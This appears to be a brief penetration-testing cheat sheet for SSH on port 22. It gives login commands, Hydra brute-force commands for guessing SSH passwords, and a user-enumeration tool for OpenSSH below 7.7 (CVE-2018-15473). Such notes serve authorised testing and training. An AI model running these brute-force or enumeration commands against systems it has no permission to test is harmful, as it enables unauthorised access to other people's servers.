# 22 - SSH

## Basic Access to SSH

```bash
user@localhost~$ ssh <USER>@<IP>
Enter Password: 
```

## Acces with a Private Key

```bash
chmod 600 id_rsa
user@localhost~$ ssh -i id_rsa <USER>@<IP>
```

## Bruteforcing SSH with Hydra

### When you have an username

```bash
user@localhost~$ hydra -l <USER> -P <WORDLIST> <IP> ssh
```

### When you don't have an username

```bash
user@localhost~$ hydra -L <WORDLIST> -P <WORDLIST> <IP> ssh
```

## SSH User Enumeration

{% hint style="warning" %}
OpenSSH < 7.7
{% endhint %}

Tool : [SSH User Enumeration](https://github.com/epi052/cve-2018-15473)

```bash
user@localhost~$ ./ssh-username-enum.py -t <THREADS> -w <WORDLIST> <IP>
[+] <USERNAME> found!
```
